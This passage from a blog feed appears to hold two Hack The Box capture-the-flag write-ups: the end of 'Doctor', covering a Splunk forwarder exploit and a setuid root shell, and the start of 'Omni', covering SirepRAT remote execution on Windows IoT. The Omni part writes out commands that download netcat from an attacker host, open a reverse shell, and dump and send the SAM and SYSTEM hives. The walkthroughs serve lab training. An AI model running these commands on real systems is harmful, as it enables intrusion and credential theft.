&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_list&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_app&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_global&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_user&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_write&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;modifiable&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;owner&amp;quot;&amp;gt;nobody&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;perms&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;lt;s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;s:key name=&amp;quot;read&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &amp;lt;s:list&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &amp;lt;s:item&amp;gt;*&amp;lt;/s:item&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &amp;lt;/s:list&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;s:key name=&amp;quot;write&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &amp;lt;s:list&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &amp;lt;s:item&amp;gt;*&amp;lt;/s:item&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &amp;lt;/s:list&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;removable&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;sharing&amp;quot;&amp;gt;app&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;install_source_checksum&amp;quot;&amp;gt;3d642ab909020d9844b47dbf1a38c77cf7b9e0a0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;label&amp;quot;&amp;gt;APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;location&amp;quot;&amp;gt;/opt/splunkforwarder/etc/apps/APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;managed_by_deployment_client&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;name&amp;quot;&amp;gt;APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;show_in_nav&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;source_location&amp;quot;&amp;gt;/opt/splunkforwarder/etc/apps/APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;state_change_requires_restart&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;status&amp;quot;&amp;gt;installed&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;visible&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/content&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/entry&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/feed&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Removing the malicious splunk app...&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Tue, 29 Sep 2020 09:22:44 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Expires: Thu, 26 Oct 1978 00:00:00 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/xml; charset=UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;X-Content-Type-Options: nosniff&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 1797&lt;/span&gt;
&lt;span class="code-line"&gt;Vary: Cookie, Authorization&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: Close&lt;/span&gt;
&lt;span class="code-line"&gt;X-Frame-Options: SAMEORIGIN&lt;/span&gt;
&lt;span class="code-line"&gt;Server: Splunkd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!--This is to override browser formatting; see server.conf[httpServer] to disable. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .--&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml-stylesheet type=&amp;quot;text/xml&amp;quot; href=&amp;quot;/static/atom.xsl&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;feed xmlns=&amp;quot;http://www.w3.org/2005/Atom&amp;quot; xmlns:s=&amp;quot;http://dev.splunk.com/ns/rest&amp;quot; xmlns:opensearch=&amp;quot;http://a9.com/-/spec/opensearch/1.1/&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;title&amp;gt;localapps&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;id&amp;gt;https://127.0.0.1:8089/services/apps/local&amp;lt;/id&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;updated&amp;gt;2020-09-29T11:22:44+02:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;generator build=&amp;quot;a1a6394cc5ae&amp;quot; version=&amp;quot;8.0.5&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;name&amp;gt;Splunk&amp;lt;/name&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_new&amp;quot; rel=&amp;quot;create&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:totalResults&amp;gt;0&amp;lt;/opensearch:totalResults&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:itemsPerPage&amp;gt;30&amp;lt;/opensearch:itemsPerPage&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:startIndex&amp;gt;0&amp;lt;/opensearch:startIndex&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;s:messages/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/feed&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] If all went well run /tmp/.tester/bin/shdoor -p for a root shell&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Run whoami if your prompt didn&amp;#39;t change...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] DELETE THE .tester DIRECTORY AS ROOT WHEN YOU&amp;#39;RE DONE! [!]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then run the binary &lt;code&gt;shdoor&lt;/code&gt; and get a root shell allowing us to retrive the
root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;shaun@doctor:/tmp$ /tmp/.tester/bin/shdoor -p&lt;/span&gt;
&lt;span class="code-line"&gt;/tmp/.tester/bin/shdoor -p&lt;/span&gt;
&lt;span class="code-line"&gt;# id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1002(shaun) gid=1002(shaun) euid=0(root) groups=1002(shaun)&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;d32cd0d4b24856&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="SSTI"></category><category term="Splunk"></category></entry><entry><title>HTB: Omni</title><link href="https://maggick.fr/2021/02/htb-omni.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-omni.html</id><summary type="html">&lt;p&gt;&lt;img alt="Omni Card" class="align-left" src="/media/2021.02/omni_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/271"&gt;Omni&lt;/a&gt; publish on
August 22, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
This box is rated as easy box. I was mostly intrigue by the "Other" operating
system. It implies some Google search, a RAT and SecureStrings.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/omni_card.png" alt="Omni Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/271"&gt;Omni&lt;/a&gt; publish on
August 22, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
This box is rated as easy box. I was mostly intrigue by the "Other" operating
system. It implies some Google search, a RAT and SecureStrings.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Aug 31 11:13:25 2020 as: nmap -p- -oN nmap -sSV 10.10.10.204&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.204&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.079s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65529 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc    Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  upnp     Microsoft IIS httpd&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp  open  upnp     Microsoft IIS httpd&lt;/span&gt;
&lt;span class="code-line"&gt;29817/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;29819/tcp open  arcserve ARCserve Discovery&lt;/span&gt;
&lt;span class="code-line"&gt;29820/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port29820-TCP:V=7.80%I=7%D=8/25%Time=5F452B08%P=x86_64-pc-linux-gnu%r(N&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ULL,10,&amp;quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(GenericLines,10,&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(Help,10,&amp;quot;\*LY\xa5\xfb`\x0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:4G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(JavaRMI,10,&amp;quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:c9}\xc8O\x12&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This look like a Windows Server with some strange open ports. When trying to
access the web service on port 8080 we got a basic auth with the message
"Windows Device Portal". We google to find the default user and password
&lt;code&gt;administrator:p@ssw0rd&lt;/code&gt; but they don't work here. So we google for just "Windows Device Portal".&lt;/p&gt;
&lt;p&gt;We learn that this is a Windows IOT operating system. We search for "Windows IOT exploit"
but that lead us to a lot of general media article. So we specify our search to
"Windows IOT exploit github". We found some &lt;a href="https://github.com/SafeBreach-Labs/SirepRAT"&gt;python code to exploit the Sirep
service&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="rce-and-reverse-shell"&gt;RCE and reverse shell&lt;/h2&gt;
&lt;p&gt;We install the python2 dependencies and quickly realize that there is a bug with the &lt;code&gt;enum&lt;/code&gt; library.
A few Google search told us that we need to use the &lt;code&gt;aenum&lt;/code&gt; library instead of &lt;code&gt;enum&lt;/code&gt;
So we modify each &lt;code&gt;from enum import Enum&lt;/code&gt; to &lt;code&gt;from aenum import Enum&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then we can use the tool to execute command on the system. After a few classic
commands we upload netcat (&lt;code&gt;/usr/share/windows-binaries/nc.exe&lt;/code&gt;)
to the box using the python HTTP server (&lt;code&gt;python3 -m http.server&lt;/code&gt;) and writing
it directly in &lt;code&gt;C:\&lt;/code&gt;. Then we run it to get a reverse shell, but this trigger an error as out netcat is a 32bits
binary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc.exe -Uri http://10.10.14.119:8000/nc.exe&amp;quot; --v&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c C:\\nc.exe 10.10.14.119 1234 -e cmd.exe&amp;quot; --v---------&lt;/span&gt;
&lt;span class="code-line"&gt;This version of C:\nc.exe is not compatible with the version of Windows you&amp;#39;re running. Check your computer&amp;#39;s system information and then contact the software publisher.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We download nc64.exe from the
&lt;a href="https://github.com/int0x33/nc.exe/raw/master/nc64.exe"&gt;internet&lt;/a&gt;,
re-upload it and run it again.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc64.exe -Uri http://10.10.14.119:8000/nc64.exe&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c C:\\nc64.exe 10.10.14.119 1234 -e cmd.exe&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a netcat listener at the same time and get a shell as &lt;code&gt;NT/SYTSEM&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp/srv$ nc -l -p 1234&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username% &lt;/span&gt;
&lt;span class="code-line"&gt;echo %username%&lt;/span&gt;
&lt;span class="code-line"&gt;omni$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;Powershell&lt;/span&gt;
&lt;span class="code-line"&gt;Powershell&lt;/span&gt;
&lt;span class="code-line"&gt;Windows PowerShell &lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\windows\system32&amp;gt; [System.Security.Principal.WindowsIdentity]::GetCurrent().Name&lt;/span&gt;
&lt;span class="code-line"&gt;[System.Security.Principal.WindowsIdentity]::GetCurrent().Name&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\SYSTEM&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we are system we could access all file on the system. We found &lt;code&gt;user.txt&lt;/code&gt; and
&lt;code&gt;root.txt&lt;/code&gt; in &lt;code&gt;C:\Data\Users\app&lt;/code&gt; and &lt;code&gt;C:\Data\Users\Adminsitrator&lt;/code&gt; but the
content of the file is an &lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file"&gt;Encrypted
String&lt;/a&gt;.
We will need to be the &lt;code&gt;app&lt;/code&gt; and &lt;code&gt;administrator&lt;/code&gt; users to decrypt the files. We
also notice the &lt;code&gt;hardening.txt&lt;/code&gt; and &lt;code&gt;iot-admin.xml&lt;/code&gt; files. The first one is just
a text file with some (unimportant) informations about the box's configuration.
The second one seems to be the &lt;code&gt;administrator&lt;/code&gt; user's password as an Encrypted
String. So once we are the &lt;code&gt;app&lt;/code&gt; user we would quickly be able to get the user
flag and the &lt;code&gt;administrator&lt;/code&gt; password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;cd C:\Data&lt;/span&gt;
&lt;span class="code-line"&gt;cd C:\Data&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data&amp;gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of C:\Data&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          CrashDump&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  12:22 AM                 0 FirstBoot.Complete&lt;/span&gt;
&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          Logfiles&lt;/span&gt;
&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          Programs&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:22 PM    &amp;lt;DIR&amp;gt;          SharedData&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:22 PM    &amp;lt;DIR&amp;gt;          SystemData&lt;/span&gt;
&lt;span class="code-line"&gt;10/26/2018  11:38 PM    &amp;lt;DIR&amp;gt;          test&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Users&lt;/span&gt;
&lt;span class="code-line"&gt;10/26/2018  11:38 PM    &amp;lt;DIR&amp;gt;          Windows&lt;/span&gt;
&lt;span class="code-line"&gt;              1 File(s)              0 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              8 Dir(s)   4,691,017,728 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data&amp;gt;cd Users\app&lt;/span&gt;
&lt;span class="code-line"&gt;cd Users\app&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of C:\Data\Users\app&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          3D Objects&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Documents&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Downloads&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Favorites&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  08:20 PM               344 hardening.txt&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  08:14 PM             1,858 iot-admin.xml&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Music&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Pictures&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:53 PM             1,958 user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Videos&lt;/span&gt;
&lt;span class="code-line"&gt;              3 File(s)          4,160 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              9 Dir(s)   4,691,017,728 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type hardening&lt;/span&gt;
&lt;span class="code-line"&gt;type hardening&lt;/span&gt;
&lt;span class="code-line"&gt;The system cannot find the file specified.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type hardening.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type hardening.txt&lt;/span&gt;
&lt;span class="code-line"&gt;- changed default administrator password of &amp;quot;p@ssw0rd&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;- added firewall rules to restrict unnecessary services&lt;/span&gt;
&lt;span class="code-line"&gt;- removed administrator account from &amp;quot;Ssh Users&amp;quot; group&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="dumping-hashes"&gt;Dumping hashes&lt;/h2&gt;
&lt;p&gt;As we are &lt;code&gt;SYSTEM&lt;/code&gt; we can dump the &lt;code&gt;SYSTEM&lt;/code&gt; and &lt;code&gt;SAM&lt;/code&gt; hive to extract the users
passwords' hashes with &lt;code&gt;reg save&lt;/code&gt;. We then transfer them to our Kali box using
netcat.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;reg save hklm\system C:\system&lt;/span&gt;
&lt;span class="code-line"&gt;reg save hklm\system C:\system&lt;/span&gt;
&lt;span class="code-line"&gt;The operation completed successfully.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt; reg save hklm\sam c:\sam&lt;/span&gt;
&lt;span class="code-line"&gt;reg save hklm\sam c:\sam&lt;/span&gt;
&lt;span class="code-line"&gt;The operation completed successfully.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;cd c:\&lt;/span&gt;
&lt;span class="code-line"&gt;cd c:\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;c:\&amp;gt;nc64.exe 10.10.14.119 1235 &amp;lt; system&lt;/span&gt;
&lt;span class="code-line"&gt;nc64.exe 10.10.14.119 1235 &amp;lt; system&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;c:\&amp;gt;nc64.exe 10.10.14.119 1235 &amp;lt; sam&lt;/span&gt;
&lt;span class="code-line"&gt;nc64.exe 10.10.14.119 1235 &amp;lt; sam&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cracking-hashes"&gt;Cracking hashes&lt;/h2&gt;
